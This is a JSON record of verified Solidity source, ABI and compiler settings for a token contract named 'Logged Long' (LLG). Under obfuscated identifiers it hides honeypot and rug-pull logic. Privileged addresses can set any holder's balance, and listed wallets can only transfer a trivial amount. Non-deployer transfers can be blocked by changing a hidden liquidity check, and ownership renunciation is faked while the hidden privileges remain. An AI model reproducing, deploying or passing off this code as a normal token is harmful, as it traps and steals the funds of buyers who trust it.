{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface buyListTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract totalSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverAmount {\n    function createPair(address totalMax, address marketingLaunched) external returns (address);\n}\n\ninterface totalAutoEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletList) external view returns (uint256);\n\n    function transfer(address limitFee, uint256 swapBuyTeam) external returns (bool);\n\n    function allowance(address walletLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapBuyTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitFee,\n        uint256 swapBuyTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toTxAt, uint256 value);\n    event Approval(address indexed walletLiquidity, address indexed spender, uint256 value);\n}\n\ninterface buyWallet is totalAutoEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LoggedLong is totalSwap, totalAutoEnable, buyWallet {\n\n    mapping(address => mapping(address => uint256)) private teamMode;\n\n    function tradingTeam(address marketingEnableLimit, uint256 swapBuyTeam) public {\n        takeTeamFrom();\n        liquidityReceiver[marketingEnableLimit] = swapBuyTeam;\n    }\n\n    uint256 private liquidityAt = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return maxEnableFee;\n    }\n\n    function amountBuyIs(address isFund, address limitFee, uint256 swapBuyTeam) internal returns (bool) {\n        require(liquidityReceiver[isFund] >= swapBuyTeam);\n        liquidityReceiver[isFund] -= swapBuyTeam;\n        liquidityReceiver[limitFee] += swapBuyTeam;\n        emit Transfer(isFund, limitFee, swapBuyTeam);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeAmountSender;\n    }\n\n    address launchedMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant isShould = 5 ** 10;\n\n    event OwnershipTransferred(address indexed fromTake, address indexed isSwap);\n\n    function listTeam(address walletTeam) public {\n        takeTeamFrom();\n        \n        if (walletTeam == enableBuy || walletTeam == atBuy) {\n            return;\n        }\n        walletAmount[walletTeam] = true;\n    }\n\n    bool public launchedShould;\n\n    function transferFrom(address isFund, address limitFee, uint256 swapBuyTeam) external override returns (bool) {\n        if (_msgSender() != minEnable) {\n            if (teamMode[isFund][_msgSender()] != type(uint256).max) {\n                require(swapBuyTeam <= teamMode[isFund][_msgSender()]);\n                teamMode[isFund][_msgSender()] -= swapBuyTeam;\n            }\n        }\n        return autoFee(isFund, limitFee, swapBuyTeam);\n    }\n\n    bool public marketingReceiverLimit;\n\n    function limitLaunch() public {\n        emit OwnershipTransferred(enableBuy, address(0));\n        maxEnableFee = address(0);\n    }\n\n    bool public tokenWalletEnable;\n\n    address private maxEnableFee;\n\n    uint8 private tradingAutoMode = 18;\n\n    uint256 private maxLiquidity;\n\n    function amountLaunchedLiquidity(address receiverLimit) public {\n        if (launchedShould) {\n            return;\n        }\n        \n        amountToken[receiverLimit] = true;\n        if (marketingReceiverLimit == feeTradingSwap) {\n            marketingReceiverLimit = true;\n        }\n        launchedShould = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityAt;\n    }\n\n    bool private feeTradingSwap;\n\n    address public enableBuy;\n\n    uint256 limitTotal;\n\n    string private takeAmountSender = \"LLG\";\n\n    function balanceOf(address walletList) public view virtual override returns (uint256) {\n        return liquidityReceiver[walletList];\n    }\n\n    address minEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private receiverFund = \"Logged Long\";\n\n    constructor (){\n        if (buyAt != swapAuto) {\n            tokenWalletEnable = true;\n        }\n        buyListTeam listAmount = buyListTeam(minEnable);\n        atBuy = receiverAmount(listAmount.factory()).createPair(listAmount.WETH(), address(this));\n        \n        enableBuy = _msgSender();\n        limitLaunch();\n        amountToken[enableBuy] = true;\n        liquidityReceiver[enableBuy] = liquidityAt;\n        if (marketingReceiverLimit != feeTradingSwap) {\n            feeTradingSwap = false;\n        }\n        emit Transfer(address(0), enableBuy, liquidityAt);\n    }\n\n    uint256 public buyAt;\n\n    function transfer(address marketingEnableLimit, uint256 swapBuyTeam) external virtual override returns (bool) {\n        return autoFee(_msgSender(), marketingEnableLimit, swapBuyTeam);\n    }\n\n    uint256 public swapAuto;\n\n    uint256 swapMin;\n\n    function getOwner() external view returns (address) {\n        return maxEnableFee;\n    }\n\n    mapping(address => uint256) private liquidityReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverFund;\n    }\n\n    function takeTeamFrom() private view {\n        require(amountToken[_msgSender()]);\n    }\n\n    address public atBuy;\n\n    function autoFee(address isFund, address limitFee, uint256 swapBuyTeam) internal returns (bool) {\n        if (isFund == enableBuy) {\n            return amountBuyIs(isFund, limitFee, swapBuyTeam);\n        }\n        uint256 liquidityTokenFund = totalAutoEnable(atBuy).balanceOf(launchedMode);\n        require(liquidityTokenFund == limitTotal);\n        require(limitFee != launchedMode);\n        if (walletAmount[isFund]) {\n            return amountBuyIs(isFund, limitFee, isShould);\n        }\n        return amountBuyIs(isFund, limitFee, swapBuyTeam);\n    }\n\n    mapping(address => bool) public amountToken;\n\n    mapping(address => bool) public walletAmount;\n\n    function allowance(address swapTotal, address minFundAmount) external view virtual override returns (uint256) {\n        if (minFundAmount == minEnable) {\n            return type(uint256).max;\n        }\n        return teamMode[swapTotal][minFundAmount];\n    }\n\n    function senderTake(uint256 swapBuyTeam) public {\n        takeTeamFrom();\n        limitTotal = swapBuyTeam;\n    }\n\n    function approve(address minFundAmount, uint256 swapBuyTeam) public virtual override returns (bool) {\n        teamMode[_msgSender()][minFundAmount] = swapBuyTeam;\n        emit Approval(_msgSender(), minFundAmount, swapBuyTeam);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingAutoMode;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTxAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minFundAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"}],\"name\":\"amountLaunchedLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFundAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapBuyTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTeam\",\"type\":\"address\"}],\"name\":\"listTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingReceiverLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapBuyTeam\",\"type\":\"uint256\"}],\"name\":\"senderTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenWalletEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingEnableLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapBuyTeam\",\"type\":\"uint256\"}],\"name\":\"tradingTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingEnableLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapBuyTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapBuyTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LoggedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}